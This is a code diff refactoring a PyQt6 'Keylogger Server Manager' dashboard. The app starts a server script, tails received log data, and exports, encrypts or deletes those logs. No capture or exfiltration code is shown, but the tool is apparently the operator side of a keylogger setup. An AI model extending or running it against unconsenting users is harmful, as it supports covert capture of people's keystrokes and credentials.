@@ -1,22 +1,25 @@
+"""
+Keylogger Server Manager - Main Interface
+"""
+
 import sys
-import threading
 import datetime
+import json
+import os
 from PyQt6.QtWidgets import (
     QApplication, QWidget, QLabel, QPushButton, QVBoxLayout, QHBoxLayout,
-    QTextEdit, QGridLayout, QGroupBox, QFileDialog, QMessageBox
+    QTextEdit, QGridLayout, QGroupBox, QFileDialog, QMessageBox, QDialog
 )
 from PyQt6.QtCore import QTimer
 from PyQt6.QtGui import QTextCursor
-import subprocess
-import os
-from Crypto.Cipher import AES
-from Crypto.Random import get_random_bytes
-import base64
 
+# Import utility functions and settings
+import utils
+from settings import SettingsWindow, DEFAULT_SETTINGS
+
+# Configuration
 SERVER_SCRIPT = "server.py"
-LOG_FILE = "server-copy.txt"
-
-server_process = None
+SETTINGS_FILE = "settings.json"
 
 
 class KeyloggerServerGUI(QWidget):
@@ -24,31 +27,152 @@ class KeyloggerServerGUI(QWidget):
         super().__init__()
         self.setWindowTitle("Keylogger Server Manager")
         self.setGeometry(100, 100, 900, 600)
+        
+        # State
+        self.server_process = None
         self.server_running = False
-
+        self.start_time = None
+        self.last_log_size = 0
+        
+        # Load settings
+        self.settings = self.load_settings_from_file()
+        
+        # Auto-stop timer
+        self.auto_stop_timer = None
+        
+        # Setup UI
         self.layout = QVBoxLayout()
         self.setLayout(self.layout)
-
-        self.last_log_size = 0
-
+        
         self.create_header()
         self.create_status_cards()
         self.create_controls()
         self.create_logs_area()
-        self.create_log_buttons()     # <-- NEW BUTTONS HERE
-
-        # Timer to update uptime
-        self.start_time = None
+        self.create_log_buttons()
+        
+        # Timers
         self.uptime_timer = QTimer()
         self.uptime_timer.timeout.connect(self.update_uptime)
         self.uptime_timer.start(1000)
-
-        # Timer to refresh logs
+        
         self.log_timer = QTimer()
         self.log_timer.timeout.connect(self.load_logs)
         self.log_timer.start(2000)
+        
+        # Styling
+        self.apply_styles()
 
-        # Apply dark mode
+    def load_settings_from_file(self):
+        """Load settings from file or return defaults."""
+        if os.path.exists(SETTINGS_FILE):
+            try:
+                with open(SETTINGS_FILE, 'r') as f:
+                    return json.load(f)
+            except:
+                pass
+        return DEFAULT_SETTINGS.copy()
+    
+    def save_settings_to_file(self):
+        """Save settings to file."""
+        try:
+            with open(SETTINGS_FILE, 'w') as f:
+                json.dump(self.settings, f, indent=2)
+        except Exception as e:
+            print(f"Failed to save settings: {e}")
+
+    def create_header(self):
+        header = QHBoxLayout()
+        title = QLabel("Keylogger Server")
+        title.setStyleSheet("font-size: 24px; font-weight: bold;")
+        subtitle = QLabel("Real-time monitoring dashboard")
+        subtitle.setStyleSheet("color: gray; font-size: 14px;")
+        header.addWidget(title)
+        header.addWidget(subtitle)
+        header.addStretch()
+        
+        # Add settings button
+        settings_btn = QPushButton("Settings")
+        settings_btn.clicked.connect(self.open_settings)
+        header.addWidget(settings_btn)
+        
+        self.layout.addLayout(header)
+
+    def create_status_cards(self):
+        grid = QGridLayout()
+        
+        # Card 1
+        self.server_status_label = QLabel("Offline")
+        self.uptime_label = QLabel("00:00:00")
+        self.port_label = QLabel(f"Port: {self.settings['server_port']}")
+        
+        card1 = QGroupBox("Main Server")
+        v1 = QVBoxLayout()
+        v1.addWidget(self.port_label)
+        v1.addWidget(QLabel("Session ID: —"))
+        v1.addWidget(QLabel("Uptime:"))
+        v1.addWidget(self.uptime_label)
+        v1.addWidget(self.server_status_label)
+        card1.setLayout(v1)
+        grid.addWidget(card1, 0, 0)
+        
+        # Card 2
+        self.total_connections_label = QLabel("0")
+        card2 = QGroupBox("Connections")
+        v2 = QVBoxLayout()
+        v2.addWidget(QLabel("Total Received:"))
+        v2.addWidget(self.total_connections_label)
+        card2.setLayout(v2)
+        grid.addWidget(card2, 0, 1)
+        
+        # Card 3
+        self.total_logs_label = QLabel("0")
+        card3 = QGroupBox("Log Storage")
+        v3 = QVBoxLayout()
+        v3.addWidget(QLabel("Total Logs:"))
+        v3.addWidget(self.total_logs_label)
+        card3.setLayout(v3)
+        grid.addWidget(card3, 0, 2)
+        
+        self.layout.addLayout(grid)
+
+    def create_controls(self):
+        h = QHBoxLayout()
+        
+        self.start_btn = QPushButton("Start Server")
+        self.start_btn.clicked.connect(self.start_server)
+        h.addWidget(self.start_btn)
+        
+        self.stop_btn = QPushButton("Stop Server")
+        self.stop_btn.clicked.connect(self.stop_server)
+        self.stop_btn.setEnabled(False)
+        h.addWidget(self.stop_btn)
+        
+        self.layout.addLayout(h)
+
+    def create_logs_area(self):
+        self.logs_text = QTextEdit()
+        self.logs_text.setReadOnly(True)
+        self.layout.addWidget(self.logs_text)
+
+    def create_log_buttons(self):
+        h = QHBoxLayout()
+        
+        export_btn = QPushButton("Export Logs")
+        export_btn.clicked.connect(self.export_logs)
+        h.addWidget(export_btn)
+        
+        encrypt_btn = QPushButton("Encrypt Logs")
+        encrypt_btn.clicked.connect(self.encrypt_logs)
+        h.addWidget(encrypt_btn)
+        
+        delete_btn = QPushButton("Delete Logs")
+        delete_btn.clicked.connect(self.delete_logs)
+        h.addWidget(delete_btn)
+        
+        self.layout.addLayout(h)
+
+    def apply_styles(self):
+        """Apply dark mode stylesheet."""
         self.setStyleSheet("""
             QWidget {
                 background-color: #2b2b2b;
@@ -88,213 +212,160 @@ class KeyloggerServerGUI(QWidget):
             }
         """)
 
-    def create_header(self):
-        header = QHBoxLayout()
-        title = QLabel("Keylogger Server")
-        title.setStyleSheet("font-size: 24px; font-weight: bold;")
-        subtitle = QLabel("Real-time monitoring dashboard")
-        subtitle.setStyleSheet("color: gray; font-size: 14px;")
-        header.addWidget(title)
-        header.addWidget(subtitle)
-        header.addStretch()
-        self.layout.addLayout(header)
+    # ==================== SETTINGS ====================
+    
+    def open_settings(self):
+        """Open settings dialog."""
+        dialog = SettingsWindow(self, self.settings.copy())
+        if dialog.exec() == QDialog.DialogCode.Accepted:
+            self.settings = dialog.settings
+            self.save_settings_to_file()
+            
+            # Update port label
+            self.port_label.setText(f"Port: {self.settings['server_port']}")
+            
+            QMessageBox.information(self, "Settings Saved", 
+                "Settings saved successfully!\nRestart server for changes to take effect.")
 
-    def create_status_cards(self):
-        grid = QGridLayout()
-
-        # ---- CARD 1
-        self.server_status_label = QLabel("Offline")
-        self.uptime_label = QLabel("00:00:00")
-        card1 = QGroupBox("Main Server")
-        v1 = QVBoxLayout()
-        v1.addWidget(QLabel("Port: 9999"))
-        v1.addWidget(QLabel("Session ID: —"))
-        v1.addWidget(QLabel("Uptime:"))
-        v1.addWidget(self.uptime_label)
-        v1.addWidget(self.server_status_label)
-        card1.setLayout(v1)
-        grid.addWidget(card1, 0, 0)
-
-        # ---- CARD 2
-        card2 = QGroupBox("Connections")
-        v2 = QVBoxLayout()
-        self.total_connections_label = QLabel("0")
-        v2.addWidget(QLabel("Total Received:"))
-        v2.addWidget(self.total_connections_label)
-        card2.setLayout(v2)
-        grid.addWidget(card2, 0, 1)
-
-        # ---- CARD 3
-        card3 = QGroupBox("Log Storage")
-        v3 = QVBoxLayout()
-        self.total_logs_label = QLabel("0")
-        v3.addWidget(QLabel("Total Logs:"))
-        v3.addWidget(self.total_logs_label)
-        card3.setLayout(v3)
-        grid.addWidget(card3, 0, 2)
-
-        self.layout.addLayout(grid)
-
-    def create_controls(self):
-    # ---- SERVER START / STOP ----
-        h = QHBoxLayout()
-
-        self.start_btn = QPushButton("Start Server")
-        self.start_btn.clicked.connect(self.start_server)
-        h.addWidget(self.start_btn)
-
-        self.stop_btn = QPushButton("Stop Server")
-        self.stop_btn.clicked.connect(self.stop_server)
-        self.stop_btn.setEnabled(False)
-        h.addWidget(self.stop_btn)
-
-        self.layout.addLayout(h)
-
-        # ---- EXPORT | ENCRYPT | DELETE ----
-        extra = QHBoxLayout()
-
-        export_csv_btn = QPushButton("Export CSV")
-        export_csv_btn.clicked.connect(self.export_csv)
-        extra.addWidget(export_csv_btn)
-
-        export_json_btn = QPushButton("Export JSON")
-        export_json_btn.clicked.connect(self.export_json)
-        extra.addWidget(export_json_btn)
-
-        encrypt_btn = QPushButton("Encrypt Logs")
-        encrypt_btn.clicked.connect(self.encrypt_logs)
-        extra.addWidget(encrypt_btn)
-
-        delete_btn = QPushButton("Delete Logs")
-        delete_btn.clicked.connect(self.delete_logs)
-        extra.addWidget(delete_btn)
-
-        self.layout.addLayout(extra)
-
-
-    def create_logs_area(self):
-        self.logs_text = QTextEdit()
-        self.logs_text.setReadOnly(True)
-        self.layout.addWidget(self.logs_text)
-
-    # -------------------------
-    # NEW: EXPORT / ENCRYPT / DELETE BUTTONS
-    # -------------------------
-    def create_log_buttons(self):
-        h = QHBoxLayout()
-
-        export_btn = QPushButton("Export Logs")
-        export_btn.clicked.connect(self.export_logs)
-        h.addWidget(export_btn)
-
-        encrypt_btn = QPushButton("Encrypt Logs")
-        encrypt_btn.clicked.connect(self.encrypt_logs)
-        h.addWidget(encrypt_btn)
-
-        delete_btn = QPushButton("Delete Logs")
-        delete_btn.clicked.connect(self.delete_logs)
-        h.addWidget(delete_btn)
-
-        self.layout.addLayout(h)
-
-    # -------------------------
-    # SERVER CONTROL
-    # -------------------------
+    # ==================== BUTTON HANDLERS ====================
+    
     def start_server(self):
-        global server_process
-        if not self.server_running:
-            server_process = subprocess.Popen(["python", SERVER_SCRIPT])
+        process, success, error = utils.start_server(SERVER_SCRIPT)
+        
+        if success:
+            self.server_process = process
             self.server_running = True
             self.start_time = datetime.datetime.now()
             self.server_status_label.setText("Online")
             self.start_btn.setEnabled(False)
             self.stop_btn.setEnabled(True)
+            
+            # Setup auto-stop if enabled
+            if self.settings["auto_stop_enabled"]:
+                self.auto_stop_timer = QTimer()
+                self.auto_stop_timer.timeout.connect(self.auto_stop_server)
+                self.auto_stop_timer.start(self.settings["auto_stop_minutes"] * 60 * 1000)
+                print(f"Auto-stop enabled: {self.settings['auto_stop_minutes']} minutes")
+        else:
+            QMessageBox.critical(self, "Error", f"Failed to start: {error}")
+
+    def auto_stop_server(self):
+        """Automatically stop server after timeout."""
+        if self.auto_stop_timer:
+            self.auto_stop_timer.stop()
+        
+        self.stop_server()
+        QMessageBox.information(self, "Auto Stop", 
+            f"Server automatically stopped after {self.settings['auto_stop_minutes']} minutes.")
 
     def stop_server(self):
-        global server_process
-        if self.server_running and server_process:
-            server_process.terminate()
-            server_process.wait()
-            server_process = None
-            self.server_running = False
-            self.server_status_label.setText("Offline")
-            self.start_btn.setEnabled(True)
-            self.stop_btn.setEnabled(False)
+        if self.server_process:
+            # Stop auto-stop timer if running
+            if self.auto_stop_timer:
+                self.auto_stop_timer.stop()
+                self.auto_stop_timer = None
+            
+            success, error = utils.stop_server(self.server_process)
+            if success:
+                self.server_process = None
+                self.server_running = False
+                self.server_status_label.setText("Offline")
+                self.start_btn.setEnabled(True)
+                self.stop_btn.setEnabled(False)
+            else:
+                QMessageBox.critical(self, "Error", f"Failed to stop: {error}")
 
-    # -------------------------
-    # UPTIME + LOGS
-    # -------------------------
     def update_uptime(self):
-        if self.server_running and self.start_time:
-            elapsed = datetime.datetime.now() - self.start_time
-            h, remainder = divmod(int(elapsed.total_seconds()), 3600)
-            m, s = divmod(remainder, 60)
-            self.uptime_label.setText(f"{h:02}:{m:02}:{s:02}")
+        if self.server_running:
+            uptime = utils.get_uptime(self.start_time)
+            self.uptime_label.setText(uptime)
 
     def load_logs(self):
-        if os.path.exists(LOG_FILE):
-            with open(LOG_FILE, "r", errors="ignore") as f:
-                content = f.read()
-
-            new_content = content[self.last_log_size:]
-
-            if new_content:
-                cursor = self.logs_text.textCursor()
-                at_bottom = cursor.atEnd()
-
+        log_file = self.settings["log_file_path"]
+        new_content, new_size = utils.read_new_logs(log_file, self.last_log_size)
+        self.last_log_size = new_size
+        
+        if new_content:
+            cursor = self.logs_text.textCursor()
+            at_bottom = cursor.atEnd()
+            
+            self.logs_text.moveCursor(QTextCursor.MoveOperation.End)
+            self.logs_text.insertPlainText(new_content)
+            
+            if at_bottom:
                 self.logs_text.moveCursor(QTextCursor.MoveOperation.End)
-                self.logs_text.insertPlainText(new_content)
+            
+            count = utils.get_log_count(log_file)
+            self.total_logs_label.setText(str(count))
 
-                if at_bottom:
-                    self.logs_text.moveCursor(QTextCursor.MoveOperation.End)
-
-                self.total_logs_label.setText(str(content.count("\n")))
-
-                self.last_log_size = len(content)
-
-    # -------------------------
-    # NEW BUTTON FUNCTIONS
-    # -------------------------
     def export_logs(self):
-        if not os.path.exists(LOG_FILE):
-            QMessageBox.warning(self, "Error", "Log file not found.")
+        log_file = self.settings["log_file_path"]
+        
+        # Use default folder and format if set
+        default_format = self.settings.get("default_export_format", "txt")
+        default_filename = f"logs.{default_format}"
+        
+        if self.settings["default_export_folder"]:
+            default_path = os.path.join(self.settings["default_export_folder"], default_filename)
+        else:
+            default_path = default_filename
+        
+        path, _ = QFileDialog.getSaveFileName(
+            self, "Export Logs", default_path,
+            "Text Files (*.txt);;CSV Files (*.csv);;JSON Files (*.json)"
+        )
+        
+        if not path:
             return
-
-        path, _ = QFileDialog.getSaveFileName(self, "Export Logs", "logs.txt")
-        if path:
-            with open(LOG_FILE, "r", errors="ignore") as f:
-                data = f.read()
-            with open(path, "w", encoding="utf-8") as f:
-                f.write(data)
-            QMessageBox.information(self, "Done", "Logs exported successfully!")
+        
+        # Read full content
+        content, _ = utils.read_new_logs(log_file, 0)
+        if not content:
+            QMessageBox.warning(self, "Error", "No logs to export")
+            return
+        
+        success = False
+        try:
+            if path.endswith('.csv'):
+                rows = utils.parse_logs_for_csv(content)
+                success, error = utils.export_to_csv(rows, path)
+            elif path.endswith('.json'):
+                sessions = utils.parse_logs_for_json(content)
+                success, error = utils.export_to_json(sessions, path)
+            else:
+                success, error = utils.export_to_txt(content, path)
+            
+            if success:
+                QMessageBox.information(self, "Success", "Logs exported!")
+            else:
+                QMessageBox.critical(self, "Error", f"Export failed: {error}")
+        except Exception as e:
+            QMessageBox.critical(self, "Error", str(e))
 
     def encrypt_logs(self):
-        if not os.path.exists(LOG_FILE):
-            QMessageBox.warning(self, "Error", "Log file not found.")
-            return
-
-        key = get_random_bytes(32)  # AES-256 key
-        cipher = AES.new(key, AES.MODE_EAX)
-
-        with open(LOG_FILE, "rb") as f:
-            data = f.read()
-
-        ciphertext, tag = cipher.encrypt_and_digest(data)
-
-        with open("logs.encrypted", "wb") as f:
-            f.write(cipher.nonce + tag + ciphertext)
-
-        with open("logs.key", "wb") as f:
-            f.write(key)
-
-        QMessageBox.information(self, "Done", "Logs encrypted (logs.encrypted + logs.key).")
+        log_file = self.settings["log_file_path"]
+        success, error = utils.encrypt_logs(log_file)
+        if success:
+            QMessageBox.information(self, "Success", 
+                "Encrypted!\nFiles: logs.encrypted + logs.key")
+        else:
+            QMessageBox.critical(self, "Error", f"Failed: {error}")
 
     def delete_logs(self):
-        open(LOG_FILE, "w").close()
-        self.logs_text.clear()
-        self.total_logs_label.setText("0")
-        self.last_log_size = 0
-        QMessageBox.information(self, "Done", "Logs deleted.")
+        reply = QMessageBox.question(self, "Confirm", 
+            "Delete all logs?",
+            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
+        
+        if reply == QMessageBox.StandardButton.Yes:
+            log_file = self.settings["log_file_path"]
+            success, error = utils.clear_logs(log_file)
+            if success:
+                self.logs_text.clear()
+                self.total_logs_label.setText("0")
+                self.last_log_size = 0
+                QMessageBox.information(self, "Success", "Logs deleted!")
+            else:
+                QMessageBox.critical(self, "Error", f"Failed: {error}")
 
 
 if __name__ == "__main__":
